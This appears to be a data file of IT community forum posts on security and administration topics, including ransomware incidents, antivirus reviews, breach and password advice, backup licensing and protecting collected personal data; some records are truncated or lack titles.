2006796,Did WannaCry Ransomware Escape North Korean Containment?,"Mike Mimoso at Kaspersky's Threatpost blog raised the theory that the ransomware wasn’t contained properly and spread before it was meant to be unleashed.Malware expert Jake Williams, @MalwareJake on Twitter and founder of Rendition InfoSec, said there are “mind-blowing mistakes” in the ransomware code after an analysis of both the malware and the leaked NSA EternalBlue exploit used to spread the attack.For starters, the developers used only three Bitcoin addresses for remittance which is by itself amateur hour. However, it's not amateurs behind the WannaCry attack. North Korea is unique among APTs in that the hackers fund themselves and their country through network exploitation and theft.A Washington Post report cites an internal NSA assessment that connects, with “moderate confidence,” the North Korean government’s Reconnaissance General Bureau to WannaCry.Williams contends that the developers behind WannaCry failed to properly contain it and the EternalBlue exploit before it was ready to be fully deployed. “The killswitch domain by itself—having a way to turn this off—I totally understand.It makes perfect sense to want to have that there,” Williams said. “But if you’re going to do that, the killswitch wouldn’t simply accept a 200 status code, basically a success that yes we connected to the domain. This is version 0.0 and never intended to be in the wild. I’m 100 percent sure of that.”So it’s likely this escaped a test environment hopping from an unpatched test machine to the public internet, and eventually more than 200,000 computers and servers in 150-plus countries.“They failed to contain it,” Williams said. “When you build something like this, it’s like carrying around ebola. Pushing ebola out isn’t hard, it’s harder to keep something like that contained.

1338683,How to check logs/registry for virus infection,"Hello,While permissioning a folder I came across what looked to be some sort of ransomware attempt. It was a couple of HTML files, and a couple of text files with contact info on how to get the key to get your files unlocked. I was shocked! I immediately pulled the Ethernet connection on that server and I downloaded to a USB drive:1) MacAfee Stinger - designed to detect & remove Ransomware (Detected & removed 50 ransomware, virus, and trojan infections!)2) Sophos virus removal tool (still running)3) Malwareabytes - Not run yetSince this was an ""Accounting"" folder, I have to assume it was a targeted attempt to access/lock/hold for ransom our data.My next steps are to scan all of our company (35) servers. We are currently using Symantec Endpoint Protection, which shows you how good its working for us!What I want to do is check all of the system logs on the infected server, as well as checking the registry keys. What is the best tool, best way to do this?Thank you",5
304580,GFI Viper Online – One SpiceHead’s SMB Review (Part 1),"Like you, I’ve worked with many antivirus packages. Some work well; others not so much. Last year, I decided that our company needed to change our current A/V package. While we did not experience some of the major issues like the porn.exe virus, we did see the fake AV viruses a few times as well as see one false positive that caused a bit of pain.I researched the community, talked to other SpiceHeads, and tested a few packages. Ultimately, I decided to choose GFI Viper Business Online.This review is not to bash other A/V products and I hope you don’t too. Taking the jump to a hosted management solution was somewhat new to me, since I have primarily worked with locally installed enterprise A/V management tools. I just wanted to give my impressions of this product as I was rolling this out in our company in the hopes that you might find it useful.Management InterfaceMy first issue (not a big one) was that after purchasing the product, upon first login you are prompted to download the cloud agent. Why is that a problem? Well, at this point, I just needed to access the console so I could configure the policies in advance of deployment. Unfortunately, you need to install one agent before you can access these settings. I didn’t like that.Once in, I saw that GFI had 8 policies setup for devices like desktops, servers, SQL, and Exchange server. You can create new custom policies. Okay that is kind of nice, but what was really cool (emphasizing cool) is that the industry standards for exclusions were part of each policy. I’m used to creating these from scratch so this is a major time saver. I reviewed them for accuracy and then added a few others needed for our industry.Once you have a bunch of devices being managed, you can see them in the Network section. There are two views: list view and icon view. I tried to find a way to filter by policy and device type and unfortunately that is not a feature. If you are managing more than 75 devices, I can see this being an issue. It would be nice to filter especially if you have multiple locations. What you get in the interface is a mush of all managed devices regardless of policy or location.This is a serious limitation for larger installs.The Dashboard is minimalistic and that is a good thing. It basically is a landing page for notifications. If you have a device that has an old definition file or a file in quarantine, you will find it here. You can also get a bird's eye view of individual status on the Network Page.There is no reporting whatsoever. No reports you can run, no pretty graphs for management, and no trending analysis. The system is truly an exception-based management system. I’m currently on the fence with this.In my next post, I will cover installation and configuration of the product.",0

1702363,The Art of Losing (Your Data),"     Netflix. Target. LinkedIn. MySpace. Company brands that we are all familiar with. And they all have one thing in common: data loss due to breaches in the company’s security. Some attacks were a result of malware — others, the result of a direct attack on the business. Stolen data containing sensitive or personal information from such attacks is typically then sold on the black market or various underground forums for cash. The amount requested for these credentials is not very expensive either, with Lavasoft reporting that 100,000 LinkedIn user logins sold for a mere $2,000 in Bitcoins, or just about $.00002 per account. So how do you protect sensitive data that your business has built up, and keep your customers safe from a breach?  For that matter, what can you do to best protect your own data?Hacks and Attacks     In 2012, LinkedIn servers were hacked by Russian cybercriminals, and credential sets were stolen (more info here). The passwords were hashed; however, they proved to be vulnerable to cracking and were eventually released online. LinkedIn advised its users to change passwords and enable two-factor authentication (2FA). Fast forward to 2016, and yet more passwords were leaked online pertaining to the original data breach in 2012. Users again were advised to change their passwords and to enable 2FA on their accounts.     Another issue began around this time. People with TeamViewer and PayPal accounts began to notice odd behavior. Some PayPal users noticed that PayPal had transferred all of their funds to an overseas account, while some TeamViewer users noticed that their machines began to control themselves, eventually asking for funds to stop the behavior. Then, in a perfect storm scenario, the TeamViewer service went dark on June 1, 2016, due to a domain name system issue. These hacks and attacks catch users off-guard, and leave a dim outlook on what to do next. When it comes to odd behaviors surrounding YOUR personal information, there are proactive steps you can take to stay safe online. Follow the steps below to win at the art of protecting, not losing, your data. Proactive Steps NEVER RE-USE PASSWORDS ACROSS MULTIPLE SITES - Nearly all of the “affected” clients that TeamViewer analyzed had re-used credentials across multiple sites, including LinkedIn, MySpace and others that had recently suffered a data breach. By re-using a credential, it allows attackers to determine if your credentials are valid at any other sites in an automated fashion. So those credentials that you used to sign up for MySpace to broadcast that awesome 2005 playlist were also used to drain your PayPal account. If, for some unknown reason, a credential must be used over multiple sites, the best recommendation is to enable their two-factor authentication systems, if available —though the fundamental warning and advice remain firmly the same: Do not re-use the same password. Also, to aid with the memorization of a plethora of passwords and assist in creation of hard-to-break passwords, you can use a password manager like LastPass. It helps you create secured passwords, audits them and works much better than a sticky note.Check your accounts regularly - Another lesson that can be learned from these large-scale breaches is to be aware of your accounts and to check in on them from time to time. I have had many, many user accounts over my digital life, and have abandoned a number of them over time —some, many years ago. Trying to check each one individually is time-consuming and almost always fruitless. Have I Been Pwned? is a great resource to check if your account has been compromised in a data breach. Data is aggregated from company breaches and makes its way to “paste” sites like Pastebin, which stores online text for easy sharing. Have I Been Pwned? allows you to enter your email or usernames and determines if you were part of a data breach. The site can check against breaches concerning some of the most–used companies, like LinkedIn, MySpace, Avast and Adobe. Checking just one of my personal email addresses yielded four sites I had visited only a few times that had been compromised. You also have the availability to be notified if a credential you use becomes part of the public domain. And if any of you do have my MySpace password, I’m sorry—the music selections were horrible. Also, Tom never friended me, so there’s that …Take advantage of enterprise protections﻿ - Companies can stay on top of securing data by using a data loss protection (DLP) application like Safetica. DLPs ensure that data is appropriately used for work purposes and that nothing is misused or distributed. The application keeps malicious activity at bay, including the copying of data to a thumb drive; hacker activity; and non-standard user transfer of files off-network (presumably to sell). Agents installed on machines catalog the type of data being transferred and the applications being used, and applies rules that are created and configured to identify suspicious activity. So, for example, in the instance that these agents see an account named “haxor” sending files to a remote location or notice that someone is copying massive amounts of financial or sensitive documents when they should not be, you'll be notified to take action before the information hits the public domain. Safetica also allows the option to block websites and devices to help mitigate risks. Their agents  are very lightweight, and I have noticed no performance hits while using the application. The amount of data gathered is also pretty neat, considering generated reporting is direct and to the point. If you are looking for malicious data activity, DLP applications are your best friends.  What should you do if you've been compromised?     If you have been part of a data breach and your personal information was leaked, there are actions that you can take. Normally, large businesses are good about offering some form of credit-monitoring or data-monitoring service for free if you were part of a data breach. When Experian was hit with a data breach in 2015 that affected T-Mobile users, credit- and identity-monitoring services were offered free of charge for two years to ensure that no oddities occurred as a result of their security breach. When the Office of Personnel Management for the U.S. government was affected by a data breach, it offered identity-monitoring, credit-monitoring, and identity-restoration services; identity theft insurance; and even access to a virtual browser to protect you during online transactions. Similarly, ESET’s banking and payment protection uses a secured browser to allow you to conduct online transactions safely. Target paid back victims of its data breach; however, it only implemented more smart card systems, or “chip-and-PIN” card systems, at the point of sale, and did not offer the free monitoring services that some companies have when their data was leaked.      With our increasingly interconnected digital lives, it is difficult to keep watch over all the data that we have created. But with a bit of diligence and some proactive thinking, you can greatly reduce the risk of your credentials being used against you. It's worth doing, because the risk is very real.  After all, if it can happen to me, it can happen to anyone.﻿   ﻿Want to learn how to mitigate risk at every angle?  Read how to perform a security audit in our new tech brief, “ Security Audits: What is your game plan?”     ﻿Have you ever experienced loss due to data theft?  Have you incurred data loss in the last 12 months?  What information would you offer a colleague that is new to IT to help them protect their data?      ",11
866743,How To Stop Surging Social Engineering Attacks,"Michael Heller at TechTarget wrote a good (longish) article where he concluded: ""As more personal and corporate information is shared on the Web, social engineering techniques and attacks are becoming increasingly sophisticated, forcing enterprises to adopt new awareness training methods to protect employees.""I'm giving you a short summary and you can read the whole thing here. When looking at enterprise security, social engineering (SE) is often convincing a company employee to click a malicious link or open a malware-infected file, and the transmission method of these attacks is most often through email. SE is often a major component of IT's longstanding battle with phishing schemes. It's also an element in the resurgence of macro viruses, which are caused by SE messages that convince employees to override security settings designed to prevent macros from running.According to Cody Pierce, director of vulnerability for Arlington, Va.-based security research firm Endgame: ""Without the social engineering aspect, it's harder to get past the point where you need user interaction for the exploit,"" Pierce said. ""For macro viruses and such, there will be warnings, so you need social engineering to get users past that point.""A Social Engineering RenaissancePierce and other experts said that these types of attacks are getting more difficult to stop because of the wealth of information made publicly available on the Web via social media. That information can be used to craft much more convincing and targeted attacks, which had led to something of a renaissance for SE. ""Twitter will tell you what app is used to post, which leads to what platform is used. LinkedIn connects to work contacts, and Facebook has everyone,"" said Pierce. ""Phishing will continue to stay popular as long as we're all connecting over the Internet and easy to talk to or build a relationship with, because someone will take advantage of that situation.""According to Randy Trzeciak, technical manager at Carnegie Mellon University's CERT Insider Threat Center, outsiders will often use social media sites like Facebook, LinkedIn and Twitter to gather information and piece it together to look like an employee is receiving a message from someone they trust.""I do believe [attacks] are getting more realistic looking in terms of impersonating someone in the organization,"" Trzeciak said. ""With the amount of information publicly available on an organization's employees, outsiders are more able to craft a message that looks authentic.""Security Awareness Training Needs To Catch UpAs SE techniques get more sophisticated and attacks appear more like authentic messages, experts say that training methods need to evolve as well. Baker said that the trick to educating employees has always been to make people suspicious of these requests, but that is getting more difficult because it often isn't enough to simply have users keep an eye out for improper use of language or odd typos.Experts all agreed that traditional training sessions that happen infrequently is not enough. Trzeciak said that training needed to be done in levels, beginning with teaching employees to look out for misspellings and improper use of language. The next level includes making some employees aware when they are at more of a risk to be targeted, including those with access to financial information and other sensitive data. Lastly, employees should be made aware of sharing habits on social networks, and to be especially careful of potentially fraudulent friend requests, which could ultimately negate any controls put in place to limit access to information.A number of experts also advocated the use of more real-time training, which would include simulated internal phishing campaigns, sending text messages or social messages to employees trying to catch those who lapse.﻿We could not agree more.

1799342,How Good is Your Response to Data Breaches?,"Data breaches are commonplace,and knowing where you stand and how you can improve is key to finding the rightlevel of information-security preparedness. I wanted to share this blog fromMatthew Rosenquist, who shares some thoughts around crisis management, andvarying levels of preparedness. Basic controls: These are used to handlethe incident, and close the vulnerability of the leak, and companies withoutforesight might assemble this team after the first major data breach isdetected.  This level of capability istypically slow and focuses exclusively on aspects of the singlebreach, and management may be thinking this was a one-time event, so the effortis to find the problem, fix the issue and move on.  The problem is, the vulnerability can besystemic, and isn’t a one-and-done fix. Mature capabilities: These are usually asign of experience in companies that realize they need to look for otherweaknesses to be prepared for the next incident.   Theystrike a balance between the cost of the breach and the cost of the tools toprevent an incident. These organizations conduct risk assessments to findvulnerabilities in their data handling, may choose to pay for breach insurance,and will have internal accountability clearly established.Professional-level data-breachcapabilities: These are found in organizations that understand the value of theirdata, regulatory compliance, and the trust of their customers and partners. Theyput serious measures into place to detect beaches and they regularly testresponse capabilities. They work to keep costs down and fine-tune thecapabilities to maintain the optimal balance of corporate security,productivity, and costs.There is no universal right levelof preparedness. Every organization is different.   Ingeneral, the more serious the consequences of a data breach, the more anorganization should be looking toward mature or professional levels. When preventive controls fail,rapid detection and competent response is required to minimize the immediateand long-term losses. Stay safe!",12

2018858,Fake Airbnb and TripAdvisor listings are putting a cyber spin on rental fraud,"See the original Guardian articleFollowing yet another report of cyber fraud this recent Guardian article poses the question: ""Could you spot a bogus Airbnb listing among the genuine ones?"" The article then goes on to detail how one man was recently scammed by a convincing fake Airbnb listing. This is not a new type of fraud threat, Guardian Money first warned about this problem back in 2016 when a reader lost £800. Cyber criminals had stolen a legitimate Airbnb listing in Amsterdam, changed its details and set up a fake home page that was even complete with a “live chat service” to convince those looking to book a trip to send a bank transfer.When the victim of the latest scam booked his particular trip, everything on the Airbnb listing seemed normal. He even corresponded with the owner on dates and information, before finally sending the money. When interviewed he stated, “I’m not an idiot and run a successful internet business."" He mentioned, ""I am well used to booking holiday accommodation which, in the past, has required money to be sent via bank transfers.""The €200-a-night listing seen by Guardian Money was, as they report, expertly done and would have fooled many users, particularly those new to the website. It's not known where the image used on the fake listing was sourced from but the listing asked him to pay the money – €4,590 – to a Bank of Cyprus account based in Nicosia. The account was supposedly in the name of AIRBNB-A BRUUN.The listing stated: “The payment is processed and collected by Airbnb in full. The security of your funds is ensured, and you’ll be protected by policies, such as cancellation policies and the Guest Refund Policy. The host will receive full payment from Airbnb 24 hours after you check in. Your payment is automatically covered against internet fraud up to €20,000.”According to the victim of this particular scam, Airbnb is denying any liability. Now, when scams like this started coming to light last year Airbnb was in fact questioned why they weren't doing more to warn users, particularly first-time users of the site, about this problem. Airbnb did start putting warnings on all listings in April this year telling users to only make payments through its own platform. It also required users to use two-step verification of emails to help reduce account takeover, which sees the criminals taking control of legitimate listings which they then change.However, these measures might have come too late for some who made bookings earlier this year and may still be unaware that they have been scammed.  Anyone who sent a bank transfer for an Airbnb booking is advised to check its status immediately. An additional warning to renters seeking short-term holiday lets was mentioned in the article as well. This warning follows the uncovering of a sophisticated online scam aimed at stealing thousands of pounds from would-be tenants. Our own risk officer, Andy Norton, weighed in on this mentioning that the scam, “seems innovative. Rental fraud and rental scams have been around in a very physical way for a long time – fake landlords collecting deposits for flats that don’t exist, or collecting multiple deposits on one flat. This puts a cyber spin on that.”Now, as I know all of you out there stay up to date on cyber security best practices I'm sure those in this Community would be harder to fool. That being said, not everyone out there in the world has that same knowledge and keen eye to quickly spot similar scams.So SpiceHeads, I'm curious to know - Do you think businesses are taking the right measures to warn the general public of these types of fraudulent websites and sophisticated threats that are convincing to the untrained eye? Have you had any news of similar threats on your radar lately, or have you spotted first hand anything similar?",0

I am struggling with a decision on AV; I have used Windows Defender, Avira, Kaspersky, Symantec and recently signed up with Sophos and Carvir which sells and manages SentinelONE. I priced Sophos Cloud Server Standard + Cloud Endpoint Standard + Intercept X versus Carvir/SentinelONE. The Sophos bundle seems to me does what Carvir does with the exception of live people monitoring and help in resolving the problem but the cost difference is substantial! For 2 servers and 13 workstations for 3 years Carvir, at my cost, is 77% higher and at MSRP for both it is 183% higher. I deal with small business and this seems out of line. One advantage on both would be ransomware protection and the ability to roll back in care ransomware gets through. Is anyone using any of these, especially Carvir and/or SentinelONE?",0

608311,Webroot Bugs/Issues - Please Read If Considering Webroot!,"We recently purchased Webroot for our organization and I have been surprised at the amount of issues I've found in the program. I think other potential customers should be aware that there are many issues with the software.  This post I'm sure goes against all of the positive reviews and support you will otherwise find.  Although I am relatively happy with Webroot I thought I should share some of the issues I've discovered.Overall it appears that the business endpoint protection they offer is still very new and is currently in a transition stage from the consumer version.  The clients seem pretty solid but managing all of the clients centrally seems to be very lacking in capabilities.For example:1) Webroot reports that threats were found but fails to show what the threats were, what actions were taken, or any information about the threats.  I have been told that this is a known issue for more than a month thus far, with no fix in sight.  On a side note, I was also not emailed about this threat detection as specified in the alert settings. (see attachment)2) Webroot has many cool features, like Web Threat Shield, Identity Shield, and Outbound Firewall.  Unfortunately, if you turn these on then you can have applications, traffic, and websites blocked without any administrative notification or logs.The Web Threat shield integration with search engine results doesn't work at all.  Websites can also be blocked by Webroot without the possibility to whitelist specific sites and without any possibility for administrative notification of such an event.The outbound firewall has almost no configuration options and fails to notify the admin of any blocked activity.  Only the endpoint would show any notification.The Identity Shield can block or cripple any program it deems unsafe.  There is no way to automatically whitelist a program to prevent this.  For us, it disabled our internal messaging client.  There is no administrative notification or log of these events.  We do have the option to whitelist an MD5 of the program but this cannot be done automatically and would need to be done for any new PC added to the console.  There is also no ability to whitelist a directory.  This broke our backup software Retrospect, for example.We have therefore disabled these three features.  A responsible admin will not run software that has the ability to block websites, programs, or traffic without logging or notifying the administrator.  And even if it did, there's still no way to automatically whitelist any of these things.3) A number of issues with versions and upgrades.  For example, I can install the MSI for version 8.0.4.131 but the client reports version 8.0.4.123 being installed and then tries to update.  There are probably 5 or more small issues I've found like this where things are obviously buggy.  I've reported many to Webroot via support tickets but the responses never seem to address the bugs.  Prepare to do some registry digging...4) Detected threats do not show the full path of the malware (for the reports that actually show what malware was detected).  I've had detections that I've been unable to see where the malware was located.  This is a bit ridiculous for a business product.5) There are a number of other implementation details regarding how the clients are reported to the web console.  For example, a client might report ""Protected"" for many days when in fact Webroot is not even installed on the client.  There are many instances like this that do not make sense.  I can elaborate further if anyone is interested.-----All this being said, Webroot does have many awesome things about it and I am NOT recommending avoiding it.  Just be aware that there are many features and issues with it presently that may or may not be fixed/implemented.  I have gone out of my way to submit support tickets for many of the bugs I've found but it doesn't seem like that does any good.  I get the feeling that the issues I've found are ignored so long as things are running pretty well for most people.﻿Has anyone else found any issues with Webroot?  Am I expecting too much?  Maybe I'm crazy?",0

825383,VPN access for PC outsourcing company to pre-stage machines?,"We outsource our PC installation process, it's not really worth getting into the reasons why because it's not in my remit but long story short it means that each month a third party comes onsite and does all the PC swaps for that month.I'm being asked if it would be possible to allow the third party VPN access from their build lab to our network so that they can do all of the pre-staging before the PC comes on-site vs. what they do now which is bring a PC onsite that's built with our base image, join it to our domain, and have a bunch of stuff installed via Group Policy.The reasons being given are that it will save them time.  My suspicions are that when they priced up the job they went in low to win and have now realised that it's taking longer than they expected as nothing has changed at our end that means swapping a machine should take any longer now than it did when they first started doing this.Essentially I don't think shaving ten minutes off a PC build is worth compromising our network over because the nature of what they'd be doing would mean a site-to-site VPN tunnel where we would have little to no control over what they might be connecting at their end - suffice to say this concerns me.I'd be interested in any views on whether this is a normal thing to do and I'd especially like to hear from those of you on here who do this kind of thing for a living and how you handle this with your customers - I don't want to be seen to be being obstructive but if enough people tell you something...",0

431839,Ah yes...the dramatic return of the .Zip file attachment malware,"Greetings post holiday resolution keeping Spiceheads!Todays peal of wisdom comes to us courtesy of Symantec Anti-Spam analyst Eric ParkHe posted a blog earlier today:  .Zip Attachment Spam Makes a Grand ReturnI've known IT Pro types long enough to believe that anyone who opens a .zip file without already know exactly what's in it...deserves whatever happens to them.  However...I also know that when that dope infects the network, it's YOU lot who end up having to put Humpty Dumpty back together again.That being said...let's take a look at what Eric has to say...check it:After a long hiatus, spammers are once again using an old trick, where they attach a .zip file to trick the user into executing the compressed malware. The chart below shows the number of spam messages with .zip attachments over the last 90 days in Symantec’s Global Intelligence Network (GIN).Figure 1. Spam messages with .zip attachments over the last 90 daysOn January 7, 99.81 percent of the .zip attachment spam that came into Symantec’s GIN had the file name “BankDocs-”  followed by 10 hexadecimal characters.Figure 2.

Email with “Invoice-E_” .zip attachmentOn January 9, 98.94 percent of the .zip attachment spam seen in Symantec’s GIN had a file name “Early2013TaxReturnReport_” followed by 10 hexadecimal characters.         Figure 4. Email with “Early2013TaxReturnReport_” .zip attachmentOn January 10, 98.84 percent of the .zip attachment spam seen in Symantec’s GIN had a file name “[BRAND NAME REDACTED]_December_2013_” followed by 10 hexadecimal characters.Figure 5. Email with “[BRAND NAME REDACTED]_December_2013_” .zip attachmentWhile these examples have different file names and MD5s, they all carry the same malware, identified by Symantec as Trojan.Zbot. This Trojan has primarily been designed to steal confidential information from the compromised computer.It appears that the large attack has subsided for now, as the spam volume returned to normal levels after January 10, but it is just a matter of time before spammers organize another large campaign. Users should keep their antivirus software up-to-date and should not open attachments from unknown sources.I leave you with the same question as always:  Is this kind of post helpful?  Annoying?  Meh?  I have a few thousand experts available...if you want more stuff like this, let me know.  If you want different stuff, let me know.  Or if it's just ENOUGH ALREADY, PLEASE STOP...let me know.",12

1970503,Poll: Does the FCC's rollback of ISP privacy rules affect you?,"This week, the Federal Communications Commission (FCC) voted to stay a set of privacy rules that would have required internet service providers (ISP) to protect personal data such as Social Security numbers and to disclose security breaches to the FBI. The vote came at the direction of the new FCC Chairman, Ajit Pai, who has been a vocal critic of the net neutrality rules and regulations spearheaded by his predecessor, Tom Wheeler. In a statement, the FCC said, ""The Commission’s stay will provide time for the FCC to work with the FTC to create a comprehensive and consistent framework for protecting Americans’ online privacy."" The FCC goes on to mention the 2015 Open Internet Order, which ceded regulatory responsibility of ISPs to the FCC.Pai says this was a mistake. In a joint statement with FTC Chairman Maureen K Ohlhausen this week, Pai acknowledged criticisms that his rollback of privacy rules for ISPs would leave consumers unprotected but went on to say that such protections are within the FTC's domain and not the FCC's. Since the FTC regulates internet services such as Google and Facebook, Pai argues it should also regulate ISPs, which he calls an internet service.The bottom line, however, is at present the FTC cannot regulates ISPs and the FCC is backing away from regulating ISPs. And now, ISPs are under no legal obligation to protect personal data or report security breaches to their customers. How do you think this regulatory change will or will not impact you? Does this decision make your job more difficult and further expose US businesses to digital security threats? If you work in a medical setting, how will this complicate your ability to comply with HIPAA? ",0

1996587,Applocker or alternative solution - School - RPGMaker and Unity,"Hello,Long time lurker, and definitely appreciate this community here. Anyway, just had something that we've been wrestling with for the longest time and were trying to figure out the best way to address it.Okay, so I'm a sys admin working at a technology school, Middle and High (grades 6-12). In the curriculum, we have a few course that teach RPG Maker (VX version). RPG Maker in particular has been the source of quite a few headaches.We normally enforce executable policies using AppLocker, but with this particular program, an executable is generated for each student project. Each executable is unique to each student project so we can't do hash restrictions. We can't do publisher restrictions because the executable generated by the program doesn't quite have that information (already tried Setreg using the SDK). File name restrictions wouldn't really get us anywhere since I figure students will just simply rename other executables to match so they can get around the restrictions. We've had to implement very little enforcement in these tech rooms because of RPG Maker and this has been the source of many headaches since many students utilizing these labs just play whatever games they want in there.I had a few thoughts on how to address this. I've proposed that we could set up one particular network location where they can house and run their projects and use quotas to limit what they can run there (which would block out a lot of the games they tend to play here). Yes, it wouldn't block everything (which is still a major concern, esp with ransomware), but at least it would tackle a large part of the issue, with students housing hundreds of Gigs of games in their home drives (and no we can't quite enforce quotas for students because of those taking courses utilizing Photoshop and Premiere where they have a large number of video assets and also those in Yearbook who are housing tons of images).I'd LOOOVE to throw RPG Maker out the door, but they actually teach Unity here too, so that's another program we will have to take into account for this issue. So with that, I'm looking any possible ideas or suggestions here, along with a few questions. Can we have both audit and enforce set for Applocker? I'm mainly thinking if we have our regular enforcement set for most folders, but set audit for the folders we designate them to run RPG Maker, that would help out so when stuff is run that isn't approved, at least we'd know who ran it. However, every where I look seems to indicate you're either set to enforce or audit only. Not both.Are there any alternatives out there that we could possibly pair with Applocker to help us in this endeavor?Any other suggestions on how we could possibly tackle this issue, still allowing access for RPG Maker and Unity, while restricting other games and executables from running?Your input will be much appreciated. Thanks in advance",0

We have a disk storage there too. The two sites are connected using a limited WAN connection.Can you please help me to do this? Here are my thoughts, please correct me if I'm wrong:For the licenses that we should buy for the main office:1- Buy a license for BE2012 media server. We will install the media server on a new VM.2- To be able to do GRT-restores, we'll have to buy Agent for Applications and Databases and install it on the Exchange 2010 VM (the Exchange vm itself?! - admin guide page 788). We will have to install Agent for Windows on the Exchange 2010 VM (admin guide pages 780/788/853).3- Buy 3 license for Agent for Hyper-V and VMware since we have ESX servers.4- Buy a license for Deduplication option, to save space on the storage.5- Buy a license for Enterprise option, to enable CASO to communicate with another BE2012 media server on the DR site.For the DR site, we need to purchase the following:1- Buy a license for BE2012 media server and install it on a new VM.2- Buy 3 license for Agent for Hyper-V and VMware and install one on each standby ESX server.Then here comes the configuration steps:In our main office, we will do a full backup every Saturday 11:00PM, incremental every other day at 11:00 PM.Using the CASO option to benefit from offsite optimized deduplication (no rehydration to send data offsite), duplicate these jobs to the DR site's BE media server, which is attached to the disk storage threre.In our DR site, schedule a redirected restore job to restore the backup data that was received from the main office to the standby ESX servers in the DR site (I guess we need to buy another deduplication option license for the DR media server, right?).Thank you in advance",11
2007445,Password Reuse Attacks – Constant Security Concern,"BY JIM NITTERAUER  Every so often another data breach makes the headlines. Some big name company discloses the loss of user data including credentials. Here is a list of the major breaches that have occurred in 2017. Within days if not hours, that data becomes available for purchase on the dark web and eventually on the open web for anyone to download. Over time, security analysts reviewing this data overwhelmingly draw one conclusion from the data – users love to use insecure passwords and reuse those same passwords across multiple accounts.So how do these analysts come to this conclusion? By simply correlating usernames across services and comparing passwords. Remember, usernames are typically an email address, first initial and last name or some other easy to guess or infer combination. A username in itself is nothing more than an identifier and has no inherent security. The password component of a login is the security component of a typical login.All username / password combinations are a form of Type I authentication (AKA something you know) and are the least secure method of authentication. Many providers now offer a second layer of authentication based upon Type II authentication (AKA something you have). This is typically the delivery of a unique code to a device that you possess like a cell phone or tablet.When this is combined with the existing login authentication, the result is called “Two Factor Authentication” or “2FA.” This type of authentication dramatically reduces the likelihood that some else can log in using your Type I credentials without your knowledge.Unfortunately, many users don’t enable 2FA for sites that support it. The other common habit is password reuse – using the same password for more than one site or service. The danger comes from breach data dumps that get posted publicly. All that is necessary then is for a malicious actor to try that username / password combination on other high value sites – an attack called a Password Reuse Attack. If the password has been re-used by the user across more than one site, the result could range from a minor inconvenience to devastating.REDUCING RISKSSo how does one reduce risk while maintaining convenience for the end user? Here are a few action items:Enable Two Factor Authentication (2FA) for all applications that support itUse a password manager to manage logins across applications like- LastPass- Intel True Key- Dashlane- RoboForm- KeePass (Local vault)Consider adding 2FA using something like Duo to all your applications.Require users use a password generator along with a password manager.Force users to change passwords immediately when a breach or compromise is reported.Set a policy for minimum password requirements (Length, complexity, etc).Require that users NOT reuse passwords. This is hard to enforce but make the policy anyway.Users will complain initially but once they learn new habits, your risk profile will be lower and you will rest easier. I personally don’t believe that resetting passwords on a regular basis has any redeeming value if your initial passwords are sufficiently complex and passwords are not reused. When users do change passwords on a regular basis, they usually make a minor change to their existing password and end up with a  bunch of similar passwords across accounts.  Users are also forced to re-authorize any account that changes on connected devices. Password managers and 2FA virtually eliminate this behavior. The better approach is to change passwords only when a compromise is suspected.ONGOING AWARENESS KEY TO SUCCESSFUL SECURITYThe key to successful security is ongoing user awareness training along with providing the tools and procedures that make it easier for users to implement security.If your users suspect they have been compromised, they can check using the site Have I Been Pwned. This site is maintained by Troy Hunt, a Microsoft Regional Director. Users simply enter their email address and get a list of sites that include their username. If they get any hits, the results will indicate whether or not password data was included. If they find a password compromise, they should reset their password at ALL SITES where that password was used. Then they should change it to something different at every site. Stay secure out there!",0

627159,Our CryptoWall 2.0 experience:,"Thought our experience might be helpful to others.    Summary: Off-line backups are the only path to recovery.  This is not a virus and doesn’t spread but can encrypt anything the users has access to.  Your primary task is to ID and disconnect the infected computer from the network. Then it is easy to scan for the DECRYPT_INSTRUCTIONS to find the encrypted folders and replace with backup copies. Details:On Halloween, a user was looking at a folder she had just created and it had several files named “DECRYPT_INSTRUCTIONS” in the folder.  She deleted the files, unplugged her network cable, turned off her wi-fi and called us. We started a search on all folders she had access to and found 2 shared folders (and all subfolders) that were encrypted.  There were 20 folders in that level and only 2 were maliciously encrypted.  Folders that were encrypted had DECRYPT_INSTRUCTIONS.txt and .html in the folder.We called our consultant and he asked a few questions:Do you have backups and where are they?What shared folders does she have access to?The consultant said that the encryption happens on the “Patient Zero” computer and it encrypts what it has access to but doesn’t spread itself like a virus. Then we pulled the plug on our file server, did a search and found 1 more folder that was encrypted.  Listed them all in an Excel file (right-click > copy as path) so we could clearly see the folder levels that were affected. We then stopped the shares permissions of the  mapped folders by exporting a registry key. (http://support.microsoft.com/kb/125996) then edited the registry key to remove the affected shares.   For an abundance of caution, we searched all local Windows client c drives for “decrypt” before reattaching the file server.We found a laptop with CryptoWall on our workbench (it had been pulled from the user’s desk a week before for running slow).  We had already run McAfee, Malwarebytes and Hitman Pro on it with no detections.  There was a pop up on that laptop explaining  what happened and how to pay.  There was DECRYPT_INSTRUCTIONS.txt and .html on the C drive as well.  We figured out that it was “Patient Zero” and the other laptop had just clicked on the DECRYPT_INSTRUCTIONS on the shared drive. We still don’t know how the laptop got infected. We only know when it started encrypting files.  We had already done the GroupPolicy App Data Cryptolocker block so we don't know if that halted the progress for awhile. Our shadow volume copies restore attempts were not successful as they had been encrypted or corrupted also.  We restored the files from backup tapes.  Considerations:This is what we encountered with the self-proclaimed CyberWall 2.0 variant.  It may have changed by the time I finished writing this. How often do you back up to off-line or tape backups?  Our loss-time was 1 day because it happened at the end of the workday.

One of my non-profit clients asked me to create an online registration form for parents to fill out because it's more convenient than the old paper-based method. Here's where I get concerned...The form collects a considerable amount of Personally Identifiable Information (PII):- Parent's name, home address, home phone, cell phone, email- Each child's name, date of birth, school name, grade, cell phone, email, allergies, special needs, outside activitiesOf course that gets my spidy-sense tingling. I don't want to create a liability concern.I've read guidelines on Coppa.org for collecting info about minors under age 13.It's easy enough to create the web form. While we can limit access of info only to the necessary program managers, it worries me how we pass this info securely online. I realize that a web form generally sends the details insecurely to a recipient email inbox.  FYI, We're using WordPress & GravityForms for the website; and Google Apps for Nonprofits for email.So what should I do?1. Don't generate email and instead force the program managers to login to the website CMS to view/download the data?2. Get an SSL certificate and encrypt the form submission. But I'm not sure whether that would email the data securely.3. Perhaps use Google Doc to create an input form to directly put the data in a spreadsheet.Is there something else?Thanks in advance for your advice/suggestions.-Roland",0
